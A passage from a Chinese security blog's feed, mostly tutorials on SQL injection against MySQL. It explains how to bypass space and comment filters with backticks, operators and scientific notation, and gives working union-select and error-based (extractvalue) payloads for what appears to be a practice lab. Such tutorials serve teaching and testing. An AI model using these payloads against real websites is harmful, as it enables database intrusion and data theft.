class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span>ide0from tuser limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line">ERROR <span class="number">1054</span> (<span class="number">42</span>S22): <span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;ide0from&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;field list&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@var</span><span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="variable">@vare2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@vare2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="variable">@var</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@var</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>根据上面测试我们看出，对于整型字段，用户定义变量等变量，科学计数法并不好使，它只适用于常量。虽然其如此有局限型，但是还是有用武之地。一般用在where id=1e0 处</p><p>下面边测试边对其用法进行讲解</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> id       <span class="operator">|</span> tinyint(<span class="number">4</span>)  <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> passwd   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">20</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>首先，这里有一张 tuser 表，id 为整型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="number">-1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是正负号的演示，当然我们一般用在整型字段上时，都用正号。我测试负号只是为了让你看的更清楚。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id.from tuser;</span><br><span class="line">ERROR <span class="number">1109</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">in</span> field list</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span>id<span class="number">-1</span><span class="operator">+</span><span class="number">1.</span><span class="keyword">from</span> tuser limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">+</span>id<span class="number">-1</span><span class="operator">+</span><span class="number">1.</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>根据上面的测试<code>+id-1+1.</code>便把整型字段前后的空格都解决了。（注：我用limit 只是因为我表中记录比较多而已，可以不用，没别的原因。）</p><p>注意：这种方法对 mysql中的整型字段/返回值为整型的都是可以用的，比如：count()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(id)<span class="operator">+</span><span class="number">1</span><span class="number">-1.</span><span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">+</span><span class="built_in">count</span>(id)<span class="operator">+</span><span class="number">1</span><span class="number">-1.</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span>              <span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>但是，注意；limit 后的数字用运算符会报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span>id <span class="keyword">from</span> tuser limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;+0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span>id <span class="keyword">from</span> tuser limit <span class="number">0</span>,<span class="number">-1</span>;</span><br></pre></td></tr></table></figure><h2 id="反引号">反引号</h2><p>强大的反引号（你键盘 esc 下面那个）这里我们可以用它来包裹很多。</p><p>它常常用来包裹那些不是有效的identifiers（字段名，表名，库名，列名，别名），比如：identifier中有空格或连字符或者与关键字冲突，你在创建或使用的时候，就要用反引号包裹起来来和别的区分开了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id`编号` <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> 编号   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>具体来说，我们可以用它来包裹：字段，库，表，别名，verison()中的version</p><p>但是不可以包裹 database()中的 database。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`version`();</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> `version`() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span><span class="number">.12</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`database`();</span><br><span class="line">ERROR <span class="number">1630</span> (<span class="number">42000</span>): <span class="keyword">FUNCTION</span> test.database does <span class="keyword">not</span> exist. <span class="keyword">Check</span> the <span class="string">&#x27;Function Name Parsing and Resolution&#x27;</span> section <span class="keyword">in</span> the Reference Manual</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`,`username`<span class="keyword">from</span>`tuser`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1e0</span><span class="keyword">order</span> <span class="keyword">by</span> username;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">3</span>fd     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  dewe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`,`username`<span class="keyword">from</span>`tuser`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1e0</span><span class="keyword">union</span> <span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  dewe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">3</span>fd     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`,`username`<span class="keyword">from</span>`tuser`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1e0</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  dewe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>  <span class="number">3</span>fd     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>注意：跨库查询时，如果要使用反引号，库名和表名都要加反引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> schema_name <span class="keyword">from</span> `information_schema`.`schemata`;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dvwa               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> schema_name <span class="keyword">from</span> `information_schema.schemata`;</span><br><span class="line">ERROR <span class="number">1146</span> (<span class="number">42</span>S02): <span class="keyword">Table</span> <span class="string">&#x27;test.information_schema.schemata&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br></pre></td></tr></table></figure><p>根据上面测试看，反引号与运算符、小数点、科学计数法一起使用，就可以绕过除了order by、union select、limit 1中间的空格了。那么这三个之间的空格呢？目前只能采用上面的编码或多行注释。</p><h2 id="数学符号">数学符号</h2><p>当然，使用 and 或 or的时候我们还可以通过使用他们的符号来避免在其周围加空格。测试如下（|| 与&amp;&amp; 测试效果一样）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select`id`,`username`from`tuser`where`id`=1&amp;&amp;1=1;</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | username |</span><br><span class="line">+------+----------+</span><br><span class="line">|    1 | admin    |</span><br><span class="line">|    1 | adam     |</span><br><span class="line">|    1 | bob      |</span><br><span class="line">|    1 | NULL     |</span><br><span class="line">|    1 | admin    |</span><br><span class="line">|    1 | adam     |</span><br><span class="line">|    1 | bob      |</span><br><span class="line">|    1 | 0        |</span><br><span class="line">|    1 |          |</span><br><span class="line">|    1 |  dewe    |</span><br><span class="line">|    1 |  3fd     |</span><br><span class="line">+------+----------+</span><br><span class="line">11 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select`id`,`username`from`tuser`where`id`=1&amp;&amp;1=0;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>未完待续...</p><h1 id="参考资料">参考资料</h1><p><a href="https://dev.mysql.com/doc/refman/8.0/en/comments.html">MySQL9.6 Comment Syntax</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL 编码那点儿事</title>
      <link href="/blog/2019/08/04/network/url-encode/"/>
      <url>/blog/2019/08/04/network/url-encode/</url>
      
        <content type="html"><![CDATA[<p>没什么好写的了，网上优秀的资料很多呀。我就是资源搬运工 haha。</p><p>好的博文：</p><p><ahref="https://aotu.io/notes/2017/06/15/The-mystery-of-URL-encoding/index.html">URL编码的奥秘</a></p><p><ahref="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html">关于 URL编码</a></p><p><a href="https://www.cnblogs.com/panchanggui/p/9436348.html">HTTP URL字符转义 字符编码 、 RFC 3986 编码规范</a></p><p>关于空格应该被编码为%20，还是+？简单来说，两个标准规定有些混乱，导致应用们实现起来也比较混乱。</p><p>摘自<ahref="https://blog.csdn.net/stpeace/article/details/60371396">空格的 urlencode 到底是+还是 ？</a></p><blockquote><p>无论是哪种规范， url decode 的时候， 都能正确 decode.实际经验表明也确实如此！</p></blockquote><p>我们不用管那么多，知道都能用就行了。</p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过注释过滤</title>
      <link href="/blog/2019/08/04/websec/sql_injection/comment-filter/"/>
      <url>/blog/2019/08/04/websec/sql_injection/comment-filter/</url>
      
        <content type="html"><![CDATA[<h2 id="检测注入点">检测注入点</h2><p>?id=1'</p><p>回显：</p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 tobe resource, boolean given in <strong>C:-labs.php</strong> on line<strong>38</strong> You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version for the rightsyntax to use near ''1'' LIMIT 0,1' at line 1</p></blockquote><p>根据报错：'1'' LIMIT0,1，我们知道闭合方式为单引号，后面还有语句，可以用注释注释掉。</p><p>下面构造：?id=1' --+ 和 ?id=1' %23</p><p>均回显：</p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 tobe resource, boolean given in <strong>C:-labs.php</strong> on line<strong>38</strong> You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version for the rightsyntax to use near '' LIMIT 0,1' at line 1</p></blockquote><p>按理说，不应该报错，就是报错也应该报：' -- LIMIT 0,1 或 ' # LIMIT0,1，这里我们可以得出，两种注释被过滤掉了。</p><p>下面看看源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>pre_replace 函数</p><blockquote><p>mixed preg_replace (mixed pattern, mixed replacement, mixed string [,int limit [, int &amp;$count]] );</p></blockquote><p>preg_replace 函数执行一个正则表达式的搜索和替换,搜索 subject 中匹配pattern 的部分， 以 replacement进行替换,后面可选的参数是用来控制替换次数与替换执行次数的。</p><p>这里，我们正式再次说一下（之前博文中讲过），两种构造 payload的小差异（其实差异也不大）。</p><ol type="1"><li>闭合前面的，注释后面的，在中间构造新语句</li><li>闭合前面的，注释后面的，在中间构造语句（当然，可以用中间构造的一部分来闭合后面的）</li></ol><p>之所以比较正式的提出这两种，是因为我们习惯了（尤指我）前一种（比较暴力，而且需要注释管用的方法），其实，从实用角度来看，后一种比较好，不用担心注释问题。</p><h2 id="猜字段">猜字段</h2><p>?id=1' order by 3,'1 3 个字段</p><p>上面涉及一个小知识点：order by后面可以跟逗号分隔的多列，进行多列排序，优先级当然是第一个优先。因此，我们可以多写一个列来闭合后面的引号。</p><h2 id="查看显示位">查看显示位</h2><p>?id=-1' union select 1,2,'3</p><p>注意：这里的第三个字段是用来与后面闭合的，'3',因此，不能用来显示东西。不信，你试试：?id=-1'union select 1,2,'version() ，可是如果只有 3是显示位，那我们该怎么办呢？</p><p>提出以下两种改进方案：（我比较喜欢第一种，因为第二种查询了database(),感觉有点过早地触发敏感信息。） ?id=-1' union select 1,2,3union select 4,5,'6 ?id=-1' union select 1,2,3 from (select database())awhere '1</p><p>第一种，就是再来一个 unionselect，因为联合查询前面语句查出来的总是靠前，因此，1，2，3还是可以用来监测显示位的。</p><p>第二种就是纯粹为了找个引号，然后从某个数据库中查 1 ，在 where条件加一个引号。</p><p>当然，此关使用报错注入等方式也可以 ?id=1' orextractvalue(1,concat(0x7e,database())) or '1'='1</p><p>后面的操作与之前类似，不再详解。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二次排序注入</title>
      <link href="/blog/2019/08/04/websec/sql_injection/stored-injection/"/>
      <url>/blog/2019/08/04/websec/sql_injection/stored-injection/</url>
      
